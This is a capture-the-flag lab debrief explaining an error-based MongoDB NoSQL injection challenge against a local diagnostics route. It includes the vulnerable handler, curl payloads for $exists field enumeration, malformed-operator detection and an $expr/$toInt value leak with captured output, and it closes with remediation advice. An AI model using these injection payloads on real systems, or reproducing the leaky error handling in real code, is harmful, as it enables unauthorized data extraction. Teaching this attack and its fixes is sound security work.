# The Diagnostic Desk, Debrief

**Node:** `p4_2` &middot; **Flag:** `SEIYAKU{the_error_said_it_all}` &middot; **Route:** `GET/POST /p4/diagnostics` &middot; **Sink:** `challenges/phase4.py`, MongoDB (`incident_reports` collection) &middot; **Signal:** real driver error text, not swallowed

New to MongoDB/MQL basics, or the type-confusion root cause this floor
shares with p4_1/p4_3? Read `phase4/records-room/DEBRIEF.md`'s "MongoDB
/ MQL basics, briefly" section first, it's the one canonical explanation
of why a dict reaching MongoDB behaves differently from a string, and
this floor builds directly on it. This debrief covers what's new here:
error-based detection and exfiltration specifically.

## Root cause

The route builds its query from request-supplied `field` and `value`,
with no type check before either reaches MongoDB, the exact same sink
shape as p4_3's Records Room (and reusing its helper functions,
`_resolve_field_and_value`/`_bracket_value`, verbatim):

```python
# challenges/phase4.py
if field and value is not None:
    db = mongo_db()
    try:
        query = {field: value}
        count = db.incident_reports.count_documents(query)
        matched = count > 0
    except Exception as exc:
        error = str(exc)   # <- the actual difference from p4_3
        matched = False
        count = 0
```

Records Room treats every exception, a malformed operator, a type
mismatch MongoDB itself rejects, exactly like an ordinary non-match: the
`except` block sets `matched = False` and moves on, deliberately
discarding whatever the driver actually said. This floor makes one
different choice: `error = str(exc)` puts the real exception text
straight into the response. That one line is the entire bug. A
realistic motivation, verbose errors left on because they're genuinely
useful for debugging a staff tool, turns a channel that would otherwise
need hundreds of blind requests (see p4_3's own walk) into something
that can confirm itself in one request and, in the right shape,
exfiltrate an entire value in one more.

## Why error-based is worth its own floor

PortSwigger's own NoSQL injection methodology leads with exactly this:
before committing to a slow boolean-blind or time-based campaign, fuzz
the target with a deliberately malformed value, a syntax probe, an
unknown operator, and see whether the application's error handling
leaks anything. It's the fastest way to confirm an injection exists, and
sometimes, as this floor demonstrates, it's also the fastest way to pull
data straight out.

This is a genuinely different technique from p4_3's boolean walk (an
oracle that answers one yes/no question per request) and from p4_4's
timing channel (an oracle that answers one yes/no question per request,
just read off a clock instead of a response body). Error-based, when it
works, isn't a bit-at-a-time oracle at all, it's a channel that can
carry an entire value in a single response.

## Stage 0: where the field name comes from

Every example below uses `field=archive_key`. `CHALLENGER.md` states
that name directly, the same way `p4_3`'s Records Room states it for
its own hidden entry. That's deliberate, and worth being explicit
about: this floor's lesson is error-based exfiltration (detection via
a malformed operator, then a one-shot leak), not blind schema
discovery, that's a different lesson entirely, and MongoDB genuinely
has no `information_schema` equivalent reachable through this route to
make it a fair one here. Handing the field name over in the brief lets
the floor focus on the technique it's actually built to teach, instead
of gatekeeping on a guessing problem the injection itself can't solve.

It's worth naming an assumption that *doesn't* hold, though: this field
name is the same one Records Room uses, but Records Room is solved
*after* this floor in the lab's own unlock order (`p4_2` before `p4_3`).
A player reaching this floor hasn't seen that convention yet, so "it's
the same name as the other floor" was never a safe thing to rely on,
the brief has to state it on its own, same as Records Room's own brief
does for itself.

### A verified bonus: this field name *is* also independently discoverable

Suppose the name hadn't been given. This floor's own response carries a
`matched` boolean, which makes `$exists` a working field-name oracle
anyway: probe a candidate name with `value[$exists]=true`, a hit means
a document somewhere in the collection has that field, a miss means it
doesn't.

```bash
curl -s -G "http://localhost:8000/p4/diagnostics" -H "Accept: application/json" \
    --data-urlencode "field=<candidate>" --data-urlencode "value[\$exists]=true"
```

Verified live, a realistic wordlist walk against this exact seed
(common CTF/application secret-field names, tried in order):

```
field=secret         -> {"matched":false,...}
field=flag           -> {"matched":false,...}
field=hidden_value   -> {"matched":false,...}
field=classified     -> {"matched":false,...}
field=archive_key    -> {"matched":true,"count":1,...}
```

Worth knowing as a general technique, blind field-name enumeration via
`$exists` against any boolean-ish MongoDB endpoint, same shape as
directory or parameter fuzzing in ordinary web testing, but it is not
the path this floor actually expects. `solvers/p4_2.sh` runs this walk
anyway, as a live demonstration that the technique holds up, before
moving on to the floor's real lesson in Stages 1-2.

## Stage 1: detection via a malformed operator

The simplest possible probe: ask for an operator that doesn't exist.

```bash
curl -s -G "http://localhost:8000/p4/diagnostics" -H "Accept: application/json" \
    --data-urlencode "field=archive_key" \
    --data-urlencode 'value[$regexx]=x'
```

Real output from this exact seed:

```json
{"count":0,"error":"unknown operator: $regexx, full error: {'ok': 0.0, 'errmsg': 'unknown operator: $regexx', 'code': 2, 'codeName': 'BadValue'}","field":"archive_key","matched":false}
```

Compare that against an ordinary, well-formed miss:

```bash
curl -s -G "http://localhost:8000/p4/diagnostics" -H "Accept: application/json" \
    --data-urlencode "field=archive_key" --data-urlencode "value=nope"
```

```json
{"field":"archive_key","matched":false,"count":0,"error":null}
```

Both report `matched:false`, the thing that's different is `error`. A
genuine non-match is `error:null`. A query MongoDB itself couldn't even
parse carries real driver text. That differential alone proves `value`
is reaching MongoDB's query language as something more than a flat
string, no boolean walk, no timing, confirmed in one request.

## Stage 2: weaponizing `$expr` + `$convert` for a one-shot leak

MongoDB's `$expr` operator lets a query express "does this computed
aggregation expression evaluate true", instead of the simpler
field-equals-value shape every other floor in this phase uses. Nested
inside it, `$toInt` (one of the `$convert` family) tries to parse a
value as a number. If it can't, and no `onError` fallback was supplied,
it raises, and **the error message it raises embeds the actual value it
failed to parse, verbatim**. This is real, documented MongoDB behavior
(MongoDB's own `$convert` reference describes `onError` as the mechanism
for *suppressing* exactly this default behavior), and it's MongoDB's
closest analogue to SQL's classic `extractvalue()`/`updatexml()`
error-based exfiltration trick.

Verified live, directly against the driver, before ever touching the
route:

```python
>>> db.incident_reports.find({"$expr": {"$eq": ["$archive_key", {"$toInt": "$archive_key"}]}}).next()
pymongo.errors.OperationFailure: Executor error during find command ::
caused by :: Failed to parse number 'SEIYAKU{the_error_said_it_all}' in
$convert with no onError value: Did not consume whole string.
```

The field's real value, the flag, sits right there in the error text.

### Reaching `$expr` through this route's own sink

`field` is exactly as unvalidated as `value` (the same point p4_3's own
docstring makes about `value` alone): nothing stops a caller from
setting `field` itself to an operator name. Set `field="$expr"` and the
entire query becomes `{"$expr": value}`, a top-level `$expr` clause
instead of an ordinary `{field: value}` equality match. `value` then
needs the full nested shape (`{"$eq": ["$archive_key", {"$toInt":
"$archive_key"}]}}`), two levels deep with an array inside, more
structure than the single-level bracket-notation parser
(`_bracket_value`) can reconstruct from a query string. A JSON body
carries it natively:

```bash
curl -s -X POST "http://localhost:8000/p4/diagnostics" \
    -H "Content-Type: application/json" -H "Accept: application/json" \
    -d '{"field":"$expr","value":{"$eq":["$archive_key",{"$toInt":"$archive_key"}]}}'
```

Real output from this exact seed:

```json
{"count":0,"error":"PlanExecutor error during aggregation :: caused by :: Failed to parse number 'SEIYAKU{the_error_said_it_all}' in $convert with no onError value: Did not consume whole string., full error: {'ok': 0.0, 'errmsg': \"PlanExecutor error during aggregation :: caused by :: Failed to parse number 'SEIYAKU{the_error_said_it_all}' in $convert with no onError value: Did not consume whole string.\", 'code': 241, 'codeName': 'ConversionFailure'}","field":"$expr","matched":false}
```

The flag, in full, inside `error`, from one request. `solvers/p4_2.sh`
automates both stages: the detection probe, a sanity check that an
ordinary miss stays quiet, then this leak, asserting the flag appears in
the response.

## A note on what this technique can and can't do

This isn't a general-purpose "read any field" primitive the way p4_3's
`$regex`/`$gt` walk is. It specifically needs a field whose real value
can plausibly be *attempted* to convert to a different type (`$toInt`,
`$toDate`, `$toDouble`, …) and fail in a way that echoes it back. It
won't trigger on a field that already holds a number, there's nothing to
fail to parse. But whenever a target field is known or suspected to hold
a string, and verbose errors reach the response, this is dramatically
faster than any blind technique: one request instead of dozens or
hundreds.

## HxH analogy

A clerk trained to stonewall still has to explain *why* a form was
rejected, somewhere, to someone, eventually, or the whole office stops
functioning. The Records Room clerk learned to say nothing at all,
every rejection looks identical to every acceptance from the outside.
This desk exists specifically because staff needed to know *why* a
search failed, and nobody considered that the honest explanation might
contain the very thing the front desk was built to protect. A sealed
envelope doesn't need to be opened if the courier, asked "what's
inside, exactly?", simply reads the contents aloud by way of explaining
why delivery failed.

## Remediation

- **Parameterize the query boundary with a type check, same root fix as
  every floor in this phase**:

  ```python
  if not isinstance(value, str):
      abort(400)
  db.incident_reports.count_documents({field: value})
  ```

  This closes the injection itself, no dict ever reaches the query, no
  `$expr`, no `$where`, no operator of any kind.

- **Never return raw driver exception text in an HTTP response,
  anywhere, for any audience.** "Staff-only" is not a security boundary
  a browser enforces; if this route is reachable at all, its error
  messages are reachable too. Log the real exception server-side, return
  a generic failure to the caller.

- **Validate `field` against an allow-list**, the same fix p4_3's
  debrief already recommends: an open field name is what let `$expr`
  reach the top level of the query at all.

- **Least-privilege database accounts**, same as every floor: a
  read-only role scoped to the fields a route legitimately needs limits
  what even a successful error-based leak can reach.
